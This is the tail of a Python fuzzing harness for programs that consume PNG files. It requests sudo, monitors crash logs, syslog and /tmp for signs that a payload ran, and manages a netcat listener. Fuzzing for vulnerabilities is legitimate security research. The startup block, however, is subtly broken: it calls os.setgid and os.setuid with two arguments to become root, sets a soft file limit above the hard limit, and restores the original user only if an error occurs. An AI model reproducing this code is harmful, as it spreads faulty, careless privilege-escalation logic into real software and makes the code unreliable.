    parser.add_argument("--data_dirs", nargs='+', default=["fuzz_results_single"], help="Directories containing historical fuzzing data for training.")
    parser.add_argument("--epochs", type=int, default=10, help="Number of training epochs for the ML model.") # New argument
    parser.add_argument("--explain_lime", action="store_true", help="Generate LIME explanations after training the ML model.") # New argument
    args = parser.parse_args()
    
    # Ensure only one of --legacy or --intelligent is active
    if args.legacy and args.intelligent:
        parser.error("Cannot use --legacy and --intelligent simultaneously. Choose one or neither.")
    if args.advisor and args.intelligent:
        parser.error("Cannot use --advisor and --intelligent simultaneously. Advisor logs suggestions, Intelligent applies them.")

    #ask for sudo upfront if not in legacy mode, since intelligent and advisor modes may require multiple elevated operations 

    if not args.train:
        request_sudo_if_needed()

    #ensure the crash monitor is initialized if we're not in legacy mode, so that we can capture Apport crashes for intelligent/advisor modes 

    if not args.legacy and not args.train:
        monitor_apport_log(last_read_pos=0) # This will initialize the crash monitor and start monitoring in the background 
    

    fuzzer = UnifiedFuzzer(args.platform, use_advisor=args.advisor, use_intelligent=args.intelligent, use_legacy=args.legacy)
    
    try:
        if args.train:
            fuzzer.train_ml_model(args.data_dirs, epochs=args.epochs, generate_lime_explanations=args.explain_lime) # Pass epochs and explain_lime
            return # Exit after training

        if args.single:
            fuzzer.fuzz_single_file(args.single)
        else:
            if not os.path.isdir(args.source):
                logger.error(
                    f"Source directory does not exist or is not a directory: {args.source}.\n"
                    "Please populate this directory with PNG files and rerun."
                )
                return
            fuzzer.fuzz_platform(args.source)
    finally:
        # Clean up netcat listener
        fuzzer.cleanup_netcat_listener()




def _search_text_in_paths(trigger_string: str, paths: List[str], max_bytes: int = 1024 * 1024) -> Optional[Tuple[str, str]]:
    """Search candidate files for a trigger string and return the first matching path and content."""
    for path in paths:
        if not path or not os.path.exists(path):
            continue
        try:
            if os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for file_name in files:
                        full_path = os.path.join(root, file_name)
                        try:
                            if os.path.getsize(full_path) > max_bytes:
                                continue
                            with open(full_path, 'r', errors='ignore') as handle:
                                content = handle.read()
                            if trigger_string in content:
                                return full_path, content.strip()
                        except Exception:
                            continue
                continue

            if os.path.getsize(path) > max_bytes:
                continue
            with open(path, 'r', errors='ignore') as handle:
                content = handle.read()
            if trigger_string in content:
                return path, content.strip()
        except Exception:
            continue
    return None


def _looks_like_png_consumer_crash_evidence(output: str) -> bool:
    """Treat crash output or signal reporting as payload execution evidence for png_consumer."""
    if not output:
        return False
    lowered = output.lower()
    if "vulnerability triggered" in lowered:
        return True
    if any(token in lowered for token in ["caught signal", "segmentation fault", "stack trace", "backtrace", "signal "]):
        return True
    if re.search(r"child process .* (6|15|16)\b", output, re.IGNORECASE):
        return True
    return False


def monitor_syslog(trigger_string: str, timeout: int = 5) -> Optional[str]:
    """Watches the system log for the specified trigger with robust seeking."""
    log_paths = ['/var/log/syslog', '/var/log/messages', '/var/log/kern.log']
    for log_path in log_paths:
        if not os.path.exists(log_path):
            continue
        try:
            with open(log_path, 'r', errors='ignore') as f:
                # Seek back a bit to catch entries that might have been written just before we started monitoring
                f.seek(0, os.SEEK_END)
                size = f.tell()
                f.seek(max(0, size - 10000), os.SEEK_SET)

                start_time = time.time()
                while time.time() - start_time < timeout:
                    line = f.readline()
                    if not line:
                        time.sleep(0.1)
                        continue

                    if trigger_string in line:
                        return line.strip()
        except Exception as e:
            logger.error(f"Error monitoring syslog at {log_path}: {e}")
    return None


def monitor_tmp_dir(trigger_string: str, timeout: int = 5) -> Optional[str]:
    """Watches the /tmp/ directory for files containing the specified trigger string."""
    tmp_path = '/tmp'
    if not os.path.exists(tmp_path):
        logger.warning(f"Temporary directory not found at {tmp_path}")
        return None
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        for root, _, files in os.walk(tmp_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                try:
                    # Only check files that are likely to be logs or small outputs
                    if os.path.getsize(file_path) > 1024 * 1024: # Skip large files
                        continue
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        if trigger_string in content:
                            logger.info(f"Payload detected in /tmp/ file: {file_path}")
                            return content.strip()
                except PermissionError:
                    pass # Ignore permission errors for /tmp/ files
                except Exception as e:
                    logger.debug(f"Error reading /tmp/ file {file_path}: {e}")
        time.sleep(0.1)
    return None



if __name__ == "__main__":
    #move netcat log files from ./logs/files/netcat to ./logs/files/netcat/old subdirectory
    #move only the log files, not the entire directory, to preserve any existing directory structure or permissions 
    for filename in os.listdir("./logs/files/netcat"):
        file_path = os.path.join("./logs/files/netcat", filename)
        if os.path.isfile(file_path):
            old_dir = "./logs/files/netcat/old"
            os.makedirs(old_dir, exist_ok=True)
            shutil.move(file_path, os.path.join(old_dir, filename))
            
    request_sudo_if_needed()
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        print(f'current limits : soft --> {soft}, hard-->{hard} ')
        # Try to raise to the hard limit (or to a sensible max if hard < 4096).
        # try to set uid and gid to 0 (root) if not already, to ensure we can raise limits 
        
        previousuid = os.getuid()
        previousgid = os.getgid()
        os.setgid(0, 0)
        os.setuid(0, 0)


        
        new_soft = hard*2# min(hard, -1  )
        resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard*4))
        logger.debug(f"Set RLIMIT_NOFILE to {new_soft}/{hard}")
    except Exception as exc:
        logger.debug(f"Could not raise RLIMIT_NOFILE: {exc}")

        #set uid/gid
        os.setuid(previousuid)
        os.setgid(previousgid)

    main()
